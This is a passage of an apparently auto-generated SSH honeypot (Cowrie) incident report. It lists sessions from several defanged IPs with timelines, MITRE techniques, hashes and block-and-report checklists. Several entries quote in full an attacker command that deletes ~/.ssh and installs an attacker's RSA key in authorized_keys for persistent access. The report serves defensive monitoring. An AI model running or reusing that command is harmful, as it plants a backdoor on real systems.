| `2026-04-20 22:07:02` | `cowrie.command.input` |
| `2026-04-20 22:07:02` | `cowrie.log.closed` |
| `2026-04-20 22:07:02` | `cowrie.session.params` |
| `2026-04-20 22:07:02` | `cowrie.command.input` |
| `2026-04-20 22:07:02` | `cowrie.log.closed` |
| `2026-04-20 22:07:03` | `cowrie.session.params` |
| `2026-04-20 22:07:03` | `cowrie.command.input` |
| `2026-04-20 22:07:03` | `cowrie.log.closed` |
| `2026-04-20 22:07:04` | `cowrie.session.params` |
| `2026-04-20 22:07:04` | `cowrie.command.input` |
| `2026-04-20 22:07:04` | `cowrie.log.closed` |
| `2026-04-20 22:07:04` | `cowrie.session.params` |
| `2026-04-20 22:07:04` | `cowrie.command.input` |
| `2026-04-20 22:07:04` | `cowrie.log.closed` |
| `2026-04-20 22:07:05` | `cowrie.session.params` |
| `2026-04-20 22:07:05` | `cowrie.command.input` |
| `2026-04-20 22:07:05` | `cowrie.log.closed` |
| `2026-04-20 22:07:05` | `cowrie.session.params` |
| `2026-04-20 22:07:05` | `cowrie.command.input` |
| `2026-04-20 22:07:05` | `cowrie.log.closed` |
| `2026-04-20 22:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877cc837dbf8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:08 |
| **Last Seen** | 2026-04-20 22:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:08:29` | `cowrie.session.connect` |
| `2026-04-20 22:08:29` | `cowrie.client.version` |
| `2026-04-20 22:08:29` | `cowrie.client.kex` |
| `2026-04-20 22:08:29` | `cowrie.login.success` |
| `2026-04-20 22:08:29` | `cowrie.session.params` |
| `2026-04-20 22:08:29` | `cowrie.command.input` |
| `2026-04-20 22:08:29` | `cowrie.command.failed` |
| `2026-04-20 22:08:29` | `cowrie.log.closed` |
| `2026-04-20 22:08:30` | `cowrie.session.params` |
| `2026-04-20 22:08:30` | `cowrie.command.input` |
| `2026-04-20 22:08:30` | `cowrie.session.file_download` |
| `2026-04-20 22:08:30` | `cowrie.log.closed` |
| `2026-04-20 22:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c732c0f270bb

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:08 |
| **Last Seen** | 2026-04-20 22:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:08:32` | `cowrie.session.connect` |
| `2026-04-20 22:08:32` | `cowrie.client.version` |
| `2026-04-20 22:08:32` | `cowrie.client.kex` |
| `2026-04-20 22:08:32` | `cowrie.login.success` |
| `2026-04-20 22:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e4cf58e375

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:11 |
| **Last Seen** | 2026-04-20 22:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:11:43` | `cowrie.session.connect` |
| `2026-04-20 22:11:43` | `cowrie.client.version` |
| `2026-04-20 22:11:43` | `cowrie.client.kex` |
| `2026-04-20 22:11:43` | `cowrie.login.success` |
| `2026-04-20 22:11:44` | `cowrie.session.params` |
| `2026-04-20 22:11:44` | `cowrie.command.input` |
| `2026-04-20 22:11:44` | `cowrie.command.failed` |
| `2026-04-20 22:11:44` | `cowrie.log.closed` |
| `2026-04-20 22:11:44` | `cowrie.session.params` |
| `2026-04-20 22:11:44` | `cowrie.command.input` |
| `2026-04-20 22:11:44` | `cowrie.session.file_download` |
| `2026-04-20 22:11:44` | `cowrie.log.closed` |
| `2026-04-20 22:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314022bbed7a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:11 |
| **Last Seen** | 2026-04-20 22:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:11:46` | `cowrie.session.connect` |
| `2026-04-20 22:11:46` | `cowrie.client.version` |
| `2026-04-20 22:11:46` | `cowrie.client.kex` |
| `2026-04-20 22:11:46` | `cowrie.login.success` |
| `2026-04-20 22:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad09486fbefa

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:12 |
| **Last Seen** | 2026-04-20 22:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:12:54` | `cowrie.session.connect` |
| `2026-04-20 22:12:54` | `cowrie.client.version` |
| `2026-04-20 22:12:55` | `cowrie.client.kex` |
| `2026-04-20 22:12:56` | `cowrie.login.success` |
| `2026-04-20 22:12:57` | `cowrie.session.params` |
| `2026-04-20 22:12:57` | `cowrie.command.input` |
| `2026-04-20 22:12:57` | `cowrie.command.failed` |
| `2026-04-20 22:12:57` | `cowrie.log.closed` |
| `2026-04-20 22:12:58` | `cowrie.session.params` |
| `2026-04-20 22:12:58` | `cowrie.command.input` |
| `2026-04-20 22:12:58` | `cowrie.session.file_download` |
| `2026-04-20 22:12:58` | `cowrie.log.closed` |
| `2026-04-20 22:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc5daa9228b

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:13 |
| **Last Seen** | 2026-04-20 22:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:13:02` | `cowrie.session.connect` |
| `2026-04-20 22:13:02` | `cowrie.client.version` |
| `2026-04-20 22:13:02` | `cowrie.client.kex` |
| `2026-04-20 22:13:03` | `cowrie.login.success` |
| `2026-04-20 22:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c2fa37f8967

| Field | Detail |
|---|---|
| **Source IP** | `106.13.68[.]234` |
| **First Seen** | 2026-04-20 22:13 |
| **Last Seen** | 2026-04-20 22:18 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:13:17` | `cowrie.session.connect` |
| `2026-04-20 22:13:17` | `cowrie.client.version` |
| `2026-04-20 22:13:19` | `cowrie.client.kex` |
| `2026-04-20 22:13:19` | `cowrie.login.success` |
| `2026-04-20 22:18:19` | `cowrie.session.file_upload` |
| `2026-04-20 22:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.68[.]234` to AbuseIPDB if not already reported
- [ ] Block `106.13.68[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04825c9efe9c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:16 |
| **Last Seen** | 2026-04-20 22:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:16:15` | `cowrie.session.connect` |
| `2026-04-20 22:16:15` | `cowrie.client.version` |
| `2026-04-20 22:16:16` | `cowrie.client.kex` |
| `2026-04-20 22:16:16` | `cowrie.login.success` |
| `2026-04-20 22:16:16` | `cowrie.session.params` |
| `2026-04-20 22:16:16` | `cowrie.command.input` |
| `2026-04-20 22:16:16` | `cowrie.command.failed` |
| `2026-04-20 22:16:16` | `cowrie.log.closed` |
| `2026-04-20 22:16:17` | `cowrie.session.params` |
| `2026-04-20 22:16:17` | `cowrie.command.input` |
| `2026-04-20 22:16:17` | `cowrie.session.file_download` |
| `2026-04-20 22:16:17` | `cowrie.log.closed` |
| `2026-04-20 22:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa93efa74c5

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:16 |
| **Last Seen** | 2026-04-20 22:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:16:19` | `cowrie.session.connect` |
| `2026-04-20 22:16:19` | `cowrie.client.version` |
| `2026-04-20 22:16:19` | `cowrie.client.kex` |
| `2026-04-20 22:16:19` | `cowrie.login.success` |
| `2026-04-20 22:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b772d9afec

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:17 |
| **Last Seen** | 2026-04-20 22:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:17:55` | `cowrie.session.connect` |
| `2026-04-20 22:17:55` | `cowrie.client.version` |
| `2026-04-20 22:17:55` | `cowrie.client.kex` |
| `2026-04-20 22:17:56` | `cowrie.login.success` |
| `2026-04-20 22:17:57` | `cowrie.session.params` |
| `2026-04-20 22:17:57` | `cowrie.command.input` |
| `2026-04-20 22:17:57` | `cowrie.command.failed` |
| `2026-04-20 22:17:57` | `cowrie.log.closed` |
| `2026-04-20 22:17:58` | `cowrie.session.params` |
| `2026-04-20 22:17:58` | `cowrie.command.input` |
| `2026-04-20 22:17:58` | `cowrie.session.file_download` |
| `2026-04-20 22:17:58` | `cowrie.log.closed` |
| `2026-04-20 22:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c5f83b4604

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:18 |
| **Last Seen** | 2026-04-20 22:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:18:02` | `cowrie.session.connect` |
| `2026-04-20 22:18:02` | `cowrie.client.version` |
| `2026-04-20 22:18:02` | `cowrie.client.kex` |
| `2026-04-20 22:18:03` | `cowrie.login.success` |
| `2026-04-20 22:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddbe463a464f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:20 |
| **Last Seen** | 2026-04-20 22:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:20:53` | `cowrie.session.connect` |
| `2026-04-20 22:20:53` | `cowrie.client.version` |
| `2026-04-20 22:20:53` | `cowrie.client.kex` |
| `2026-04-20 22:20:54` | `cowrie.login.success` |
| `2026-04-20 22:20:54` | `cowrie.session.params` |
| `2026-04-20 22:20:54` | `cowrie.command.input` |
| `2026-04-20 22:20:54` | `cowrie.command.failed` |
| `2026-04-20 22:20:54` | `cowrie.log.closed` |
| `2026-04-20 22:20:54` | `cowrie.session.params` |
| `2026-04-20 22:20:54` | `cowrie.command.input` |
| `2026-04-20 22:20:54` | `cowrie.session.file_download` |
| `2026-04-20 22:20:54` | `cowrie.log.closed` |
| `2026-04-20 22:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a96f3361643

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:20 |
| **Last Seen** | 2026-04-20 22:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:20:56` | `cowrie.session.connect` |
| `2026-04-20 22:20:56` | `cowrie.client.version` |
| `2026-04-20 22:20:56` | `cowrie.client.kex` |
| `2026-04-20 22:20:57` | `cowrie.login.success` |
| `2026-04-20 22:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f711bcf634c2

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:21 |
| **Last Seen** | 2026-04-20 22:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:21:12` | `cowrie.session.connect` |
| `2026-04-20 22:21:12` | `cowrie.client.version` |
| `2026-04-20 22:21:12` | `cowrie.client.kex` |
| `2026-04-20 22:21:14` | `cowrie.login.success` |
| `2026-04-20 22:21:14` | `cowrie.session.params` |
| `2026-04-20 22:21:14` | `cowrie.command.input` |
| `2026-04-20 22:21:14` | `cowrie.command.failed` |
| `2026-04-20 22:21:15` | `cowrie.log.closed` |
| `2026-04-20 22:21:15` | `cowrie.session.params` |
| `2026-04-20 22:21:15` | `cowrie.command.input` |
| `2026-04-20 22:21:16` | `cowrie.session.file_download` |
| `2026-04-20 22:21:16` | `cowrie.log.closed` |
| `2026-04-20 22:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-785e05fe6d8e

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:21 |
| **Last Seen** | 2026-04-20 22:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:21:19` | `cowrie.session.connect` |
| `2026-04-20 22:21:19` | `cowrie.client.version` |
| `2026-04-20 22:21:19` | `cowrie.client.kex` |
| `2026-04-20 22:21:21` | `cowrie.login.success` |
| `2026-04-20 22:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6338bd2aafe

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:24 |
| **Last Seen** | 2026-04-20 22:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:24:34` | `cowrie.session.connect` |
| `2026-04-20 22:24:34` | `cowrie.client.version` |
| `2026-04-20 22:24:34` | `cowrie.client.kex` |
| `2026-04-20 22:24:35` | `cowrie.login.success` |
| `2026-04-20 22:24:36` | `cowrie.session.params` |
| `2026-04-20 22:24:36` | `cowrie.command.input` |
| `2026-04-20 22:24:36` | `cowrie.command.failed` |
| `2026-04-20 22:24:36` | `cowrie.log.closed` |
| `2026-04-20 22:24:37` | `cowrie.session.params` |
| `2026-04-20 22:24:37` | `cowrie.command.input` |
| `2026-04-20 22:24:37` | `cowrie.session.file_download` |
| `2026-04-20 22:24:37` | `cowrie.log.closed` |
| `2026-04-20 22:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4b65535748

| Field | Detail |
|---|---|
